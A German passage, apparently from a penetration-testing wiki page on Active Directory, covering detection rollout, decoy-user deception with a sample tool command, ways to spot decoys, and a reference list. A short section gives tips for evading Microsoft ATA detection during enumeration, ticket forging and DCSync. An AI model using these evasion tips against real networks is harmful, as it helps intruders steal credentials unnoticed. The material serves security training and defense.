- Einige dieser Signale erfordern entschlüsselten Traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Sichtbarkeit auf Service-Seite
- Validiere gegen Samba/Linux-Clients, Appliances und Legacy-Software, bevor du sie zu Alerts hochstufst
- Stufe Erkennungen von Anreicherung -> Hunting -> Alerting hoch, während du Vertrauen in die Baseline aufbaust

### **Implementierung von Deception-Techniken**

- Deception zu implementieren bedeutet, Fallen zu stellen, etwa mit Lockvogel-Benutzern oder -Computern, mit Eigenschaften wie nicht ablaufenden Passwörtern oder Markierung als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit spezifischen Rechten oder das Hinzufügen zu Gruppen mit hoher Berechtigung.
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Ausrollen von Deception-Techniken findest du unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Deception identifizieren**

- **Für User Objects**: Verdächtige Indikatoren sind atypische ObjectSID, seltene Logons, Erstellungsdaten und niedrige Bad-Password-Counts.
- **Allgemeine Indikatoren**: Der Vergleich von Attributen potenzieller Lockvogel-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können helfen, solche Täuschungen zu identifizieren.

### **Detection-Systeme umgehen**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeiden von Session-Enumeration auf Domain Controllern, um ATA-Detection zu verhindern.
- **Ticket Impersonation**: Die Verwendung von **aes**-Keys für die Ticket-Erstellung hilft, Detection zu umgehen, indem kein Downgrade auf NTLM erfolgt.
- **DCSync-Angriffe**: Die Ausführung von einem Nicht-Domain-Controller aus wird empfohlen, um ATA-Detection zu vermeiden, da eine direkte Ausführung von einem Domain Controller aus Alerts auslöst.

## Referenzen

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
